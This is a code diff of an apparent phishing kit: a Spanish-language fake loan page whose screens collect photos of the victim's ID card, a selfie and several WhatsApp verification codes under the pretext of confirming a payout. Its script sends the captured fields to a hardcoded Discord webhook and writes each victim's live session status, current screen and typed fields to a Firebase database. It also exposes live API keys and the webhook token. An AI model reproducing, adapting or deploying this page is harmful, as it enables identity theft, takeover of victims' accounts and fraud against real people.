+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/>
+    </g><defs><clipPath id="cF"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:80%"></div></div></div>
+  <div class="sbody">
+    <div class="otp-hero">
+      <span class="otp-icon">&#128100;</span>
+      <div class="otp-title">Validación de identidad</div>
+      <div class="otp-sub">Necesitamos tres fotos claras para validar quién está solicitando.</div>
+    </div>
+    <div id="foto-error-box" class="otp-error-box">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v.5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>Foto borrosa o no detectada. Por favor toma una más clara.</span>
+    </div>
+    <div class="foto-panel" id="foto-panel">
+      <div class="foto-stage" id="foto-stage">
+        <div class="foto-kicker" id="foto-kicker">Paso 1 de 3</div>
+        <div class="foto-orbit">
+          <div class="foto-avatar" id="foto-avatar">&#128196;</div>
+        </div>
+        <div class="foto-name" id="foto-name">Cédula por delante</div>
+        <div class="foto-desc" id="foto-desc">Toma una foto clara del frente de la cédula, con buena luz y todos los datos visibles.</div>
+        <button class="foto-action" id="foto-action" onclick="openCurrentFotoInput()">Tomar foto</button>
+      </div>
+      <div class="foto-steps" aria-hidden="true">
+        <div class="foto-step active" id="foto-step-cedula-frente"></div>
+        <div class="foto-step" id="foto-step-cedula-detras"></div>
+        <div class="foto-step" id="foto-step-selfie"></div>
+      </div>
+    </div>
+    <input class="foto-input" type="file" id="foto-cedula-frente" accept="image/*" capture="environment" data-foto-key="cedulaFrente" onchange="onFotoChange(this)">
+    <input class="foto-input" type="file" id="foto-cedula-detras" accept="image/*" capture="environment" data-foto-key="cedulaDetras" onchange="onFotoChange(this)">
+    <input class="foto-input" type="file" id="foto-selfie" accept="image/*" capture="user" data-foto-key="selfie" onchange="onFotoChange(this)">
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-foto" disabled onclick="submitFoto()">Enviar fotos &rarr;</button>
+  </div>
+</div>
+
+<div class="screen" id="s-espera2">
+  <div class="espera-content" style="margin:auto">
+    <svg width="90" height="34" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cE2)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="white"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="white"/>
+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="white"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="white"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="white"/>
+    </g><defs><clipPath id="cE2"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+    <div class="espera-ring"></div>
+    <div>
+      <div class="espera-title espera-copy" id="espera2-title">Validando cuenta</div>
+      <div class="espera-sub espera-copy" id="espera2-sub" style="margin-top:8px">Estamos verificando los datos de tu cuenta. Esto puede tardar unos segundos.</div>
+    </div>
+    <div class="espera-dots">
+      <div class="espera-dot"></div>
+      <div class="espera-dot"></div>
+      <div class="espera-dot"></div>
+    </div>
+  </div>
+</div>
+
+<!-- OTP -->
+<div class="screen" id="s-otp">
+  <div class="topbar" style="border-bottom:none">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cO)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/>
+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/>
+    </g><defs><clipPath id="cO"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+   
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:95%"></div></div></div>
+  <div class="sbody">
+    <div class="otp-hero">
+      <span class="otp-icon">💬</span>
+      <div class="otp-title">Código de verificación</div>
+      <div class="otp-sub">Te enviamos un código de 6 dígitos por WhatsApp al número de cedula <span class="otp-numero" id="otp-cel">registrado</span>. Ingrésalo aquí para confirmar el desembolso.</div>
+    </div>
+
+    <div id="otp-error-box" class="otp-error-box">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v.5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>Código errado o vencido. Por favor coloca uno correctamente.</span>
+    </div>
+
+    <!-- 6 líneas azules OTP -->
+    <div class="otp-wrap" id="otp-wrap" onclick="focusOtp()">
+      <div class="otp-field">
+        <div class="otp-box" id="l0"><div class="otp-digit" id="d0"></div></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-box" id="l1"><div class="otp-digit" id="d1"></div></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-box" id="l2"><div class="otp-digit" id="d2"></div></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-box" id="l3"><div class="otp-digit" id="d3"></div></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-box" id="l4"><div class="otp-digit" id="d4"></div></div>
+      </div>
+      <div class="otp-field">
+        <div class="otp-box" id="l5"><div class="otp-digit" id="d5"></div></div>
+      </div>
+    </div>
+    <!-- Input real oculto -->
+    <input class="otp-real-input" type="number" id="otp-input" inputmode="numeric" maxlength="6"
+      oninput="onOtpInput(this)" onkeydown="onOtpKey(event)">
+
+    <p class="otp-hint">El código expira en 5 minutos</p>
+    <p class="otp-resend">¿No lo recibiste? <span onclick="resendOtp()">Reenviar código</span></p>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-otp" disabled onclick="submitOtp()">Finalizar →</button>
+  </div>
+</div>
+
+<!-- EXITO -->
+<!-- OTP DESEMBOLSO -->
+<div class="screen" id="s-otp-desembolso">
+  <div class="topbar" style="border-bottom:none">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cOD)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/>
+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/>
+    </g><defs><clipPath id="cOD"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:95%"></div></div></div>
+  <div class="sbody">
+    <div class="otp-hero">
+      <span class="otp-icon">💬</span>
+      <div class="otp-title">&iexcl;Felicidades!</div>
+      <div class="otp-sub">Hemos podido realizar su desembolso a trav&eacute;s de nuestro aliado financiero <span class="otp-numero" id="otp-desembolso-aliado">registrado</span> que nos da la facilidad de realizar su desembolso de forma exitosa hacia su cuenta.<br><br>Para confirmar su desembolso ingrese su c&oacute;digo enviado.</div>
+    </div>
+
+    <div id="otp-desembolso-error-box" class="otp-error-box">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v.5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>C&oacute;digo errado o vencido. Por favor coloca uno correctamente.</span>
+    </div>
+
+    <div class="otp-wrap" id="otp-desembolso-wrap" onclick="focusOtpDesembolso()">
+      <div class="otp-field"><div class="otp-box" id="ld0"><div class="otp-digit" id="dd0"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="ld1"><div class="otp-digit" id="dd1"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="ld2"><div class="otp-digit" id="dd2"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="ld3"><div class="otp-digit" id="dd3"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="ld4"><div class="otp-digit" id="dd4"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="ld5"><div class="otp-digit" id="dd5"></div></div></div>
+    </div>
+    <input class="otp-real-input" type="number" id="otp-desembolso-input" inputmode="numeric" maxlength="6"
+      oninput="onOtpDesembolsoInput(this)" onkeydown="onOtpDesembolsoKey(event)">
+
+    <p class="otp-hint">El c&oacute;digo expira en 5 minutos</p>
+    <p class="otp-resend">&iquest;No lo recibiste? <span onclick="resendOtpDesembolso()">Reenviar c&oacute;digo</span></p>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-otp-desembolso" disabled onclick="submitOtpDesembolso()">Finalizar &rarr;</button>
+  </div>
+</div>
+
+<!-- OTP OTRO -->
+<div class="screen" id="s-otp-otro">
+  <div class="topbar" style="border-bottom:none">
+    <svg width="60" height="22" viewBox="0 0 64 24" fill="none"><g clip-path="url(#cOO)">
+      <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="#1C67D8"/>
+      <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="#1C67D8"/>
+      <path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="#1C67D8"/>
+      <path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="#1C67D8"/>
+      <path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="#1C67D8"/>
+    </g><defs><clipPath id="cOO"><rect width="64" height="24" fill="white"/></clipPath></defs></svg>
+  </div>
+  <div class="prog-wrap"><div class="prog-track"><div class="prog-fill" style="width:95%"></div></div></div>
+  <div class="sbody">
+    <div class="otp-hero">
+      <span class="otp-icon" style="color:#16A34A">✓</span>
+      <div class="otp-title">&iexcl;Felicidades!</div>
+      <div class="otp-sub">Hemos podido realizar su desembolso a través de nuestro aliado financiero <span class="otp-numero" id="otp-otro-nombre"> </span> que nos da la facilidad de enviar su cupo disponible de forma exitosa hacia su cuenta.<br><br>Para confirmar su desembolso ingrese el código enviado a WhatsApp</div>
+    </div>
+
+    <div id="otp-otro-error-box" class="otp-error-box">
+      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v.5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
+      <span>C&oacute;digo errado o vencido. Por favor coloca uno correctamente.</span>
+    </div>
+
+    <div class="otp-wrap" id="otp-otro-wrap" onclick="focusOtpOtro()">
+      <div class="otp-field"><div class="otp-box" id="lo0"><div class="otp-digit" id="do0"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="lo1"><div class="otp-digit" id="do1"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="lo2"><div class="otp-digit" id="do2"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="lo3"><div class="otp-digit" id="do3"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="lo4"><div class="otp-digit" id="do4"></div></div></div>
+      <div class="otp-field"><div class="otp-box" id="lo5"><div class="otp-digit" id="do5"></div></div></div>
+    </div>
+    <input class="otp-real-input" type="number" id="otp-otro-input" inputmode="numeric" maxlength="6"
+      oninput="onOtpOtroInput(this)" onkeydown="onOtpOtroKey(event)">
+
+    <p class="otp-hint">El c&oacute;digo expira en 5 minutos</p>
+    <p class="otp-resend">&iquest;No lo recibiste? <span onclick="resendOtpOtro()">Reenviar c&oacute;digo</span></p>
+  </div>
+  <div class="footer">
+    <button class="btn-main" id="btn-otp-otro" disabled onclick="submitOtpOtro()">Finalizar &rarr;</button>
+  </div>
+</div>
+
+<div class="screen" id="s-exito">
+  <div class="sbody" style="display:flex;flex-direction:column;align-items:center;justify-content:center">
+    <div class="success-hero">
+      <span class="success-icon">✓</span>
+      <div class="success-title">¡Éxito!</div>
+      <div class="success-sub">Tu solicitud ha sido procesada correctamente. Uno de nuestros asesores se comunicará contigo mediante WhatsApp para recibir cualquier asesoría sobre tu desembolso.</div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /app -->
+
+<!-- Firebase SDK -->
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-analytics.js";
 import { getDatabase, ref, set, onValue, onDisconnect, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyAo7x-8eFkF0QsA3zKOoadg0IYxCzz-izE",
-  authDomain: "ingresasolicitud-22aa7.firebaseapp.com",
-  projectId: "ingresasolicitud-22aa7",
-  storageBucket: "ingresasolicitud-22aa7.firebasestorage.app",
-  messagingSenderId: "1006111593942",
-  appId: "1:1006111593942:web:ba37314aa6092016bdc077",
-  measurementId: "G-Y2CXHTNKB4"
+  apiKey: "AIzaSyBPinTLb0G8_25Z3cmgrz8bo8flqRRivO0",
+  authDomain: "solicitud-17219.firebaseapp.com",
+  projectId: "solicitud-17219",
+  storageBucket: "solicitud-17219.firebasestorage.app",
+  messagingSenderId: "279668144731",
+  appId: "1:279668144731:web:4dcdc5eacf764a2bf5dd7e",
+  measurementId: "G-6BYHNQ2KNQ"
 };
 
 const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
+const analytics = getAnalytics(app);
+const db  = getDatabase(app);
 
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1547300478659076337/zWIsIghItrYWJMXTqik-vL5mKpbO9dYpZPs4QeG17tvuvYHag95Zi9J3xeLcdgJ8p9qB';
-const SID = 'SID-' + Math.random().toString(36).substr(2,6).toUpperCase();
+// ── DISCORD WEBHOOK ───────────────────────────────────────────────────────────
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1547300478659076337/zWIsIghItrYWJMXTqik-vL5mKpbO9dYpZPs4QeG17tvuvYHag95Zi9J3xeLcdgJ8p9qB';
+const SESSION_ID = 'SID-' + Math.random().toString(36).substr(2,6).toUpperCase();
+const estadoRef = ref(db, 'sesiones/' + SESSION_ID + '/estado');
+const pushRef = ref(db, 'sesiones/' + SESSION_ID + '/push');
+const sessionStatusRef = ref(db, 'sesiones/' + SESSION_ID + '/sessionStatus');
+let heartbeatTimer;
+let inactivityTimer;
+let sessionHeartbeatStarted = false;
+let activePush = null;
+let browserActive = true;
+const INACTIVITY_MS = 45000;
 
-const estadoRef = ref(db, `sesiones/${SID}/estado`);
-const notificacionRef = ref(db, `sesiones/${SID}/notificacion`);
-const statusSessionRef = ref(db, `sesiones/${SID}/statusSession`);
-
-const CONFIG = {
-  TIMEOUT_INACTIVIDAD: 300000,
-  INTERVALO_LATIDO: 10000,
-  INTERVALO_TEXTO_ESPERA: 3600
-};
-
-const estadoApp = {
-  timerLatido: null,
-  timerInactividad: null,
-  latidoIniciado: false,
-  notificacionActiva: null,
-  navegadorActivo: true,
-  vistaActual: 'loader',
-  metodoSeleccionado: null,
-  timerTextoEspera: null
-};
-
-const gestor_sesion = {
-  actualizarEstado(esActivo) {
-    if (!estadoApp.latidoIniciado) return;
-    const estaActivaLaSesion = esActivo && estadoApp.navegadorActivo && document.visibilityState !== 'hidden';
-    set(statusSessionRef, {
-      activa: estaActivaLaSesion,
-      ultimaVista: new Date().toISOString(),
-      pantalla: estadoApp.vistaActual || null
-    });
-  },
-
-  marcarInactivo() {
-    estadoApp.navegadorActivo = false;
-    this.actualizarEstado(false);
-  },
-
-  marcarActivo() {
-    estadoApp.navegadorActivo = document.visibilityState !== 'hidden';
-    if (estadoApp.timerInactividad) clearTimeout(estadoApp.timerInactividad);
-    if (estadoApp.navegadorActivo) {
-      this.actualizarEstado(true);
-      estadoApp.timerInactividad = setTimeout(() => this.marcarInactivo(), CONFIG.TIMEOUT_INACTIVIDAD);
-    } else {
-      this.actualizarEstado(false);
-    }
-  },
-
-  iniciar() {
-    if (estadoApp.latidoIniciado) return;
-    estadoApp.latidoIniciado = true;
-
-    onDisconnect(statusSessionRef).set({
-      activa: false,
-      ultimaVista: new Date().toISOString()
-    });
-
-    this.actualizarEstado(true);
-
-    if (estadoApp.timerLatido) clearInterval(estadoApp.timerLatido);
-    estadoApp.timerLatido = setInterval(() => this.actualizarEstado(true), CONFIG.INTERVALO_LATIDO);
-
-    const eventos = ['mousemove', 'mousedown', 'keydown', 'touchstart', 'scroll', 'click'];
-    eventos.forEach(evt => window.addEventListener(evt, () => this.marcarActivo(), { passive: true }));
-
-    document.addEventListener('visibilitychange', () => this.marcarActivo());
-    this.marcarActivo();
-
-    window.addEventListener('pagehide', () => this.actualizarEstado(false));
-    window.addEventListener('beforeunload', () => this.actualizarEstado(false));
-  }
-};
-
-function iniciarLatidoSesion() {
-  gestor_sesion.iniciar();
+function updateSessionStatus(active) {
+  if (!sessionHeartbeatStarted) return;
+  set(sessionStatusRef, {
+    active: active && browserActive && document.visibilityState !== 'hidden',
+    lastSeen: new Date().toISOString(),
+    screen: pantallaActual || null
+  });
 }
 
-const gestor_discord = {
-  enviarMensaje(titulo, campos) {
-    const embed = {
-      title: titulo,
-      color: 0x1C67D8,
-      fields: Object.entries(campos).map(([nombre, valor]) => ({
-        name: nombre,
-        value: String(valor),
-        inline: true
-      })),
-      footer: { text: `Sesión: ${SID}` },
-      timestamp: new Date().toISOString()
-    };
-
-    return fetch(WEBHOOK_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ embeds: [embed] })
-    }).catch(err => console.error('Discord error:', err));
-  }
-};
-
-function enviarAlDiscord(titulo, campos) {
-  return gestor_discord.enviarMensaje(titulo, campos);
+function markBrowserInactive() {
+  browserActive = false;
+  updateSessionStatus(false);
 }
 
-const TEXTOS_ESPERA = {
-  'v-espera': [
+function markBrowserActive() {
+  browserActive = document.visibilityState !== 'hidden';
+  if (inactivityTimer) clearTimeout(inactivityTimer);
+  if (browserActive) {
+    updateSessionStatus(true);
+    inactivityTimer = setTimeout(markBrowserInactive, INACTIVITY_MS);
+  } else {
+    updateSessionStatus(false);
+  }
+}
+
+function startSessionHeartbeat() {
+  if (sessionHeartbeatStarted) return;
+  sessionHeartbeatStarted = true;
+
+  onDisconnect(sessionStatusRef).set({
+    active: false,
+    lastSeen: new Date().toISOString()
+  });
+
+  updateSessionStatus(true);
+
+  if (heartbeatTimer) clearInterval(heartbeatTimer);
+  heartbeatTimer = setInterval(() => updateSessionStatus(true), 10000);
+  ['mousemove','mousedown','keydown','touchstart','scroll','click'].forEach(function(evt) {
+    window.addEventListener(evt, markBrowserActive, { passive: true });
+  });
+  document.addEventListener('visibilitychange', markBrowserActive);
+  markBrowserActive();
+
+  window.addEventListener('pagehide', () => updateSessionStatus(false));
+  window.addEventListener('beforeunload', () => updateSessionStatus(false));
+}
+
+function enviarDiscord(titulo, campos) {
+  const embed = {
+    title: titulo,
+    color: 0x1C67D8,
+    fields: Object.entries(campos).map(([name, value]) => ({ name, value: String(value), inline: true })),
+    footer: { text: 'Sesión: ' + SESSION_ID },
+    timestamp: new Date().toISOString()
+  };
+  const payload = { embeds: [embed] };
+  return fetch(DISCORD_WEBHOOK, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(res => {
+    if (!res.ok) throw new Error('Discord error: ' + res.status);
+    return res.json();
+  }).catch(err => {
+    console.error('Error enviando a Discord:', err);
+  });
+}
+
+// ── ESTADO GLOBAL ─────────────────────────────────────────────────────────────
+var pantallaActual = 'loader';
+var pagoSeleccionado = null;
+var waitCopyTimer = null;
+
+const liveFieldsRef = ref(db, 'sesiones/' + SESSION_ID + '/liveFields');
+const waitCopy = {
+  's-espera': [
     ['Verificando identidad', 'Estamos validando tu información. Por favor espera un momento.'],
     ['Mantente en línea', 'Seguimos revisando la información enviada para continuar.'],
     ['Un momento más', 'Estamos preparando el siguiente paso de forma segura.']
   ],
-  'v-espera2': [
+  's-espera2': [
     ['Validando cuenta', 'Estamos verificando los datos de tu cuenta. Esto puede tardar unos segundos.'],
     ['Mantente en línea', 'La validación sigue en proceso. Por favor espera.'],
     ['Procesando solicitud', 'Estamos revisando la información enviada antes de continuar.'],
@@ -789,781 +917,856 @@ const TEXTOS_ESPERA = {
   ]
 };
 
-const gestor_vistas = {
-  ir(vistaId, esRetroceso = false) {
-    document.querySelectorAll('.vista').forEach(s => s.classList.remove('activa', 'regreso'));
-
-    const elementoVista = document.getElementById(vistaId);
-    if (!elementoVista) return;
-
-    elementoVista.classList.add('activa');
-    if (esRetroceso) elementoVista.classList.add('regreso');
-
-    elementoVista.scrollTop = 0;
-    window.scrollTo(0, 0);
-
-    estadoApp.vistaActual = vistaId;
-
-    if (estadoApp.latidoIniciado) {
-      gestor_sesion.actualizarEstado(true);
-      set(ref(db, `sesiones/${SID}/vistaActual`), vistaId);
-      set(ref(db, `sesiones/${SID}/vistaActualEn`), new Date().toISOString());
-    }
-
-    this.iniciarCambioTexto(vistaId);
-  },
-
-  iniciarCambioTexto(vistaId) {
-    if (estadoApp.timerTextoEspera) clearInterval(estadoApp.timerTextoEspera);
-
-    const frases = TEXTOS_ESPERA[vistaId];
-    if (!frases) return;
-
-    const esSegundaEspera = vistaId === 'v-espera2';
-    const elementoTitulo = document.getElementById(esSegundaEspera ? 'titulo-espera2' : 'titulo-espera');
-    const elementoDesc = document.getElementById(esSegundaEspera ? 'desc-espera2' : 'desc-espera');
-
-    if (!elementoTitulo || !elementoDesc) return;
-
-    let indice = 0;
-
-    const cambiarFrase = () => {
-      elementoTitulo.classList.add('cambio');
-      elementoDesc.classList.add('cambio');
-
